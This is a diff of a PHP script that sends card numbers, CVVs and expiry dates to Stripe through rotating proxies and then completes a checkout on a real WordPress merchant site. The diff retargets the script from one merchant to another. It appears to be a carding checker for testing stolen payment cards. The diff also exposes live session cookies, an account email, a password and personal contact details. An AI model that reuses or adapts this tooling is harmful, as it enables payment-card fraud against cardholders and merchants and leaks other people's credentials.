@@ -134,7 +134,7 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 
 # ----------------- [1req Postfields] ---------------------#
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&billing_details[name]='.$name.'+'.$last.'&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=d5d641d1-8763-493b-b1a9-f4e909c63e0bcc0c50&muid=bbaca2d9-12de-42dd-b0bc-9c27943a8cda6e9067&sid=43fd6a58-1716-45df-8d5e-2c0d0efc6b27f8cd9e&pasted_fields=number&payment_user_agent=stripe.js%2Ff5c0110cf%3B+stripe-js-v3%2Ff5c0110cf&time_on_page=130742&key=pk_live_515nZbAAufgDOIdEHyaWaOidCe5ySx7P57Lv5PPcsa56n7tWbzZE2hcy39gKhgn3Rc5eH6d6tPtr4DWHP7WbqdR0w00QyCTOpZp');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&billing_details[name]='.$name.'+'.$last.'&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=d5d641d1-8763-493b-b1a9-f4e909c63e0bcc0c50&muid=bb8c9f57-32ad-404c-a7ca-ad12792a8d6f04ef72&sid=364a64af-bb3a-46a2-941d-774c773b7f5f4a5019&pasted_fields=number&payment_user_agent=stripe.js%2Ff5c0110cf%3B+stripe-js-v3%2Ff5c0110cf&time_on_page=29942&key=pk_live_Cr3TTLP8pvQScjSVW4OpKbTX00AE5H2POt');
 
 
 
@@ -146,7 +146,7 @@ $id = trim(strip_tags(getStr($result1,'"id": "','"')));
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
 curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
-curl_setopt($ch, CURLOPT_URL, 'https://wpsimplepay.com/wp-admin/admin-ajax.php');
+curl_setopt($ch, CURLOPT_URL, 'https://wpmanageninja.com/wp-admin/admin-ajax.php');
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
@@ -157,16 +157,16 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
     curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'authority: wpsimplepay.com',
+'authority: wpmanageninja.com',
 'method: POST',
 'path: /wp-admin/admin-ajax.php',
 'scheme: https',
 'accept: application/json, text/javascript, */*; q=0.01',
 'accept-language: en-US,en;q=0.9',
 'content-type: application/x-www-form-urlencoded; charset=UTF-8',
-'cookie: wordpress_sec_d7a96d427c97e2d0904b7a9e254433af=Info3@tablig.net|1649284097|4XNZxNYlrY4UK0ll2lS5ZiS2zuAT2tXX52ZIxhmdjTq|b9d7f82eb39e42ebc7c4571b21b0b73a63501a9ab275d437b9fea304eae1e5c5; GCLB=CPnzg9CL7MbnUg; PHPSESSID=04hg2d91g10299rdifd7iael38; pixelcat_id=24f8c4ff30; __stripe_mid=bbaca2d9-12de-42dd-b0bc-9c27943a8cda6e9067; __stripe_sid=43fd6a58-1716-45df-8d5e-2c0d0efc6b27f8cd9e; edd_items_in_cart=1; wordpress_logged_in_d7a96d427c97e2d0904b7a9e254433af=Info3@tablig.net|1649284097|4XNZxNYlrY4UK0ll2lS5ZiS2zuAT2tXX52ZIxhmdjTq|5bd25aa420fd927977386c232ac8aa3406ef9275fe708a6a33008fcc34212c35',
-'origin: https://wpsimplepay.com',
-'referer: https://wpsimplepay.com/checkout/?discount=SAVE50',
+'cookie: PHPSESSID=r1b003egiie2m6enpcqg5q7du4; futm_details=a:3:{s:4:"ut_c";s:7:"upgrade";s:5:"utc_m";s:4:"menu";s:5:"utm_s";s:6:"plugin";}; na_edd_cart_token=db24bee04a292db271b46d57f4f0851e; edd_items_in_cart=1; __stripe_mid=bb8c9f57-32ad-404c-a7ca-ad12792a8d6f04ef72; __stripe_sid=364a64af-bb3a-46a2-941d-774c773b7f5f4a5019; crisp-client/session/162745af-315c-4769-b7dc-b37fc872bb0a=session_e72a3fbd-9809-4a61-af1e-7a97bccd5ce6',
+'origin: https://wpmanageninja.com',
+'referer: https://wpmanageninja.com/checkout/?discount=VDAY2021',
 'sec-fetch-dest: empty',
 'sec-fetch-mode: cors',
 'sec-fetch-site: same-origin',
@@ -175,7 +175,7 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 
 # ----------------- [2req Postfields] ---------------------#
 
-curl_setopt($ch, CURLOPT_POSTFIELDS,'action=edds_process_purchase_form&form_data=edd_email%3DInfo3%2540tablig.net%26edd_phone%3D12024087524%26phone%3D%26edd_first%3DJhon%26edd_last%3DJaox%26edd_user_login%3DInfo3%2540tablig.net%26edd_user_pass%3DHasan%2540%25234455%26edd_user_pass_confirm%3DHasan%2540%25234455%26edd_login_nonce%3Df32ef14b74%26payment-mode%3Dstripe%26card_name%3Djhon%2520mdke%26edd_action%3Dpurchase%26edd-gateway%3Dstripe%26edd-process-checkout-nonce%3D512b92513c%26edd-purchase-var%3Dneeds-to-register&payment_method_id='.$id.'&payment_method_exists=false');
+curl_setopt($ch, CURLOPT_POSTFIELDS,'action=edds_process_purchase_form&form_data=payment-mode%3Dstripe%26edd_action%3Dgateway_select%26page_id%3D267%26edd_first%3DJhon%26edd_last%3DMakdj%26edd_email%3Dsoykot_hasan%2540yahoo.com%26card_name%3DJhon%2520Jaox%26edd_action%3Dpurchase%26edd-gateway%3Dstripe%26edd-process-checkout-nonce%3D044905c6ca&payment_method_id='.$id.'&payment_method_exists=false');
 
 
 $result2 = curl_exec($ch);
